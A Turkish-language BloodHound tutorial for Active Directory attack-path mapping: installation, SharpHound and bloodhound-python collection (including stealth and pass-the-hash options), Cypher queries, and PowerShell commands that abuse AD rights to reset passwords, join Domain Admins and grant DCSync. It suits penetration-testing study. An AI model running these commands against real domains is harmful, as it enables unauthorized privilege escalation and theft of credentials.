# 🩸 BloodHound - Active Directory Saldırı Yolu Görselleştirme Kılavuzu

[🇬🇧 English](../../README.md) | [🇮🇹 Italiano](README.it.md)

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        Active Directory Saldırı Yolu Analizi
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Saldırı_Yolları-blue?style=for-the-badge" alt="Saldırı Yolları">
  <img src="https://img.shields.io/badge/Graf_Veritabanı-green?style=for-the-badge" alt="Graf">
</p>

---

## 📋 İçindekiler

- [BloodHound Nedir?](#-bloodhound-nedir)
- [Kurulum](#-kurulum)
- [SharpHound ile Veri Toplama](#-sharphound-ile-veri-toplama)
- [BloodHound Grafik Arayüzü Kullanımı](#-bloodhound-grafik-arayüzü-kullanımı)
- [Dahili Hazır Sorgular](#-dahili-hazır-sorgular)
- [Özel Cypher Sorguları](#-özel-cypher-sorguları)
- [Saldırı Yolu Analizi](#-saldırı-yolu-analizi)
- [BloodHound CE (Community Edition)](#-bloodhound-ce-community-edition)
- [Hızlı Başvuru Tablosu](#-hızlı-başvuru-tablosu)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 BloodHound Nedir?

**BloodHound**, Active Directory (AD) ortamlarındaki gizli ve doğrudan görünmeyen yetki ilişkilerini, grup üyeliklerini ve saldırı yollarını ortaya çıkarmak için çizge (graf) teorisini kullanan güçlü bir keşif aracıdır.

Neleri Görselleştirir?
- 🔗 **Saldırı Yolları (Attack Paths):** Domain Admin (Etki Alanı Yöneticisi) yetkisine giden en kısa zincirler
- 👤 **Kullanıcı İlişkileri:** Grup üyelikleri, yerel yönetici hakları, aktif kullanıcı oturumları
- 💻 **Bilgisayar Güven İlişkileri:** Yönetici hakları, oturum açılmış makineler, temsil yetkileri
- 🔓 **Yapılandırma Hataları (Misconfigurations):** İstismar edilebilir ACL/ACE izinleri
- 🎯 **Yüksek Değerli Hedefler (High-Value Targets):** Domain Controller'lar ve kritik hesaplar

### Temel Bileşenler

| Bileşen | Açıklama |
|---------|----------|
| **BloodHound** | Graf görselleştirme grafik arayüzü (Electron / Neo4j tabanlı) |
| **SharpHound** | Veri toplayıcı C# ikili dosyası (.exe veya .ps1) |
| **Neo4j** | İlişkileri saklayan NoSQL çizge veritabanı |
| **BloodHound CE** | Yeni nesil web tabanlı ve PostgreSQL arka planlı sürüm |

---

## 🚀 Kurulum

### Kali Linux

```bash
# BloodHound ve Neo4j paketlerini kurun
sudo apt update
sudo apt install bloodhound neo4j

# Neo4j servisini başlatın
sudo neo4j start

# Tarayıcıdan Neo4j konsoluna gidin: http://localhost:7474
# Varsayılan kimlik bilgileri: neo4j / neo4j (İlk girişte yeni şifre belirleyin)

# BloodHound arayüzünü başlatın
bloodhound
```

### Docker ile Çalıştırma (Önerilen)

```bash
# Neo4j konteynerini başlatın
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# BloodHound'u açın
bloodhound
```

---

## 📡 SharpHound ile Veri Toplama

### SharpHound'u İndirme
Hedef Windows ortamında çalıştırmak üzere GitHub deposundan `SharpHound.exe` veya `SharpHound.ps1` dosyasını temin edin.

### Temel Veri Toplama Komutları

```powershell
# Standart toplama (Tüm temel veriler toplanır)
.\SharpHound.exe

# Belirli bir etki alanı (domain) belirterek
.\SharpHound.exe -d domain.local

# Çıktı dizini belirterek
.\SharpHound.exe -o C:\Temp\

# PowerShell betiği üzerinden toplama
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```

### Toplama Yöntemleri (Collection Methods)

```powershell
# Tüm yöntemleri çalıştır (En kapsamlı, yüksek gürültü)
.\SharpHound.exe -c All

# Yalnızca belirli yöntemler
.\SharpHound.exe -c Default
.\SharpHound.exe -c Session       # Aktif kullanıcı oturumları
.\SharpHound.exe -c LocalAdmin    # Yerel yönetici hakları
.\SharpHound.exe -c ACL           # Nesne izinleri (DCSync vb.)
.\SharpHound.exe -c DCOnly        # Yalnızca Domain Controller'a sorgu at (Düşük gürültü)
```

| Yöntem | Açıklama | Ağ Gürültüsü |
|--------|----------|--------------|
| `Default` | Group, LocalAdmin, Session, Trusts | Düşük |
| `All` | Tüm bilgileri eksiksiz toplar | Yüksek |
| `Session` | Makinelerdeki oturum açmış kullanıcılar | Orta |
| `ACL` | Active Directory izinleri ve yetkileri | Düşük |
| `DCOnly` | Yalnızca DC'ye LDAP sorgusu gönderir | Çok Düşük (Gizli) |

### Gizli (Stealth) Toplama
```powershell
# EDR/SIEM alarmlarını azaltmak için gizli mod
.\SharpHound.exe -c DCOnly --stealth

# İstekler arasına gecikme koyma
.\SharpHound.exe --throttle 1000
```

### Linux Üzerinden Toplama (`bloodhound-python`)
Hedef makinede kod çalıştırmadan sadece geçerli bir etki alanı kullanıcısıyla ağ üzerinden veri toplama:

```bash
# Kurulum
pip install bloodhound

# Veri toplama
bloodhound-python -u 'kullanici' -p 'parola' -d domain.local -ns 10.10.10.1 -c All

# NTLM Hash ile (Pass-the-Hash)
bloodhound-python -u 'kullanici' --hashes :NTLMHASH -d domain.local -c All
```

---

## 🖥️ BloodHound Grafik Arayüzü Kullanımı

1. Neo4j servisini başlatın (`sudo neo4j start`).
2. BloodHound uygulamasını açın ve giriş yapın (`bolt://localhost:7687`).
3. Sağdaki menüden **Upload Data** butonuna tıklayarak SharpHound tarafından üretilen `.zip` dosyasını yükleyin.
4. İçe aktarma tamamlandığında grafik sekmesinde veriler analiz edilmeye hazır hale gelir.

---

## 🔍 Dahili Hazır Sorgular (Built-in Queries)

BloodHound sol panelindeki **Analysis** sekmesinde önceden hazırlanmış kritik sorguları barındırır:

- **Find all Domain Admins:** Tüm Etki Alanı Yöneticilerini listele
- **Shortest Paths to Domain Admins:** Domain Admin grubuna giden en kısa saldırı zincirini hesapla
- **Shortest Path from Owned Principals:** Ele geçirdiğiniz kullanıcıdan Domain Admin'e giden yolu bul
- **Find Kerberoastable Accounts:** SPN tanımlı ve Kerberoast yapılabilir hesapları bul
- **Find AS-REP Roastable Users:** Ön kimlik doğrulama gerektirmeyen kullanıcıları listele
- **Find Principals with DCSync Rights:** Parola hash dökümü yapabilecek (DCSync) hesapları listele
- **Find Computers where Domain Users are Local Admin:** Standart kullanıcıların yerel yönetici olduğu cihazlar

---

## 📝 Özel Cypher Sorguları (Custom Cypher Queries)

Neo4j graf veritabanında özel analizler yapmak için üstteki sorgu çubuğuna Cypher ifadeleri yazabilirsiniz:

### Temel Sorgular
```cypher
// Tüm Domain Admin üyelerini listele
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Tüm Domain Controller cihazlarını listele
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Oturum ve Yetki Sorguları
```cypher
// Domain Admin'lerin hangi bilgisayarlarda aktif oturumu olduğunu bul
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// DCSync hakkına sahip kullanıcıları listele
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name
```

### En Kısa Saldırı Yolu
```cypher
// Ele geçirdiğiniz kullanıcıdan hedefe en kısa rota:
MATCH p=shortestPath(
  (u:User {name:"HACKEDUSER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

---

## 🎯 Saldırı Yolu Analizi (Attack Path Analysis)

### Yaygın Kenarlar (Edges) ve İstismar Yöntemleri

| Kenar (Edge) | Anlamı | İstismar Tekniği |
|--------------|--------|------------------|
| **MemberOf** | Grup üyeliği | Kullanıcı grup izinlerini devralır |
| **AdminTo** | Cihazda yerel yönetici | PsExec, Evil-WinRM veya WMI ile sızma |
| **HasSession** | Aktif kullanıcı oturumu | LSASS bellek dökümü (Mimikatz) ile token/parola çalma |
| **GenericAll** | Nesne üzerinde tam denetim | Parola sıfırlama, SPN ekleme, sahipliği değiştirme |
| **GenericWrite** | Öznitelik yazma yetkisi | scriptPath, userAccountControl manipülasyonu |
| **WriteDacl** | İzinleri düzenleme yetkisi | Kendine DCSync hakkı atama |
| **ForceChangePassword** | Parola sıfırlama izni | Kullanıcının parolasını doğrudan değiştirme |
| **AddMember** | Gruba üye ekleme yetkisi | Kendini veya hedefi gruba ekleme |
| **GetChangesAll** | DCSync yetkisi | Mimikatz ile etki alanındaki tüm hash'leri çekme |

### Saldırı Kenarlarını İstismar Etme Örnekleri

#### `GenericAll` veya `ForceChangePassword` Yetkisi
```powershell
# Hedef kullanıcının parolasını sıfırlama
net user hedefkullanici YeniP@ss123! /domain

# PowerView ile:
Set-DomainUserPassword -Identity hedefkullanici -AccountPassword (ConvertTo-SecureString 'YeniP@ss123!' -AsPlainText -Force)
```

#### `AddMember` Yetkisi
```powershell
# Kendinizi doğrudan "Domain Admins" grubuna ekleyin
net group "Domain Admins" saldirgan_kullanici /add /domain
```

#### `WriteDacl` Yetkisi ile DCSync Alma
```powershell
# Kendinize etki alanı kök nesnesi üzerinde DCSync hakları tanımlayın:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity saldirgan_kullanici -Rights DCSync
```

---

## 🆕 BloodHound CE (Community Edition)

SpecterOps tarafından geliştirilen modern BloodHound CE:
- Neo4j yerine yüksek performanslı PostgreSQL veritabanı kullanır.
- Web tabanlı modern kullanıcı arayüzü sunar.
- Çoklu kullanıcı ve rol tabanlı erişim denetimini destekler.

```bash
# Docker Compose ile tek komutta başlatma:
curl -L https://ghst.ly/getbhce | docker compose -f - up -d
# Tarayıcıdan erişim: http://localhost:8080
```

---

## 📊 Hızlı Başvuru Tablosu

| Komut | Açıklama |
|-------|----------|
| `.\SharpHound.exe` | Varsayılan veri toplama |
| `.\SharpHound.exe -c All` | Tüm yöntemlerle veri toplama |
| `.\SharpHound.exe -c DCOnly` | Gizli DC tabanlı veri toplama |
| `.\SharpHound.exe -c Session --loop` | Belirli aralıklarla oturumları takip etme |
| `bloodhound-python ...` | Linux üzerinden uzaktan veri toplama |

---

## 📚 Kaynaklar

- [BloodHound Resmi Deposu](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound Veri Toplayıcısı](https://github.com/BloodHoundAD/SharpHound)
- [bloodhound.py Deposu](https://github.com/fox-it/BloodHound.py)
- [AD Saldırı Metodolojimiz](../../AD-Attack-Methodology/translations/README.tr.md)

---

<p align="center">
  <b>🩸 Domain Admin'e Giden Yolu Keşfedin!</b><br>
  <i>Saldırganlar grafiklerle düşünür, savunucular listelerle</i>
</p>
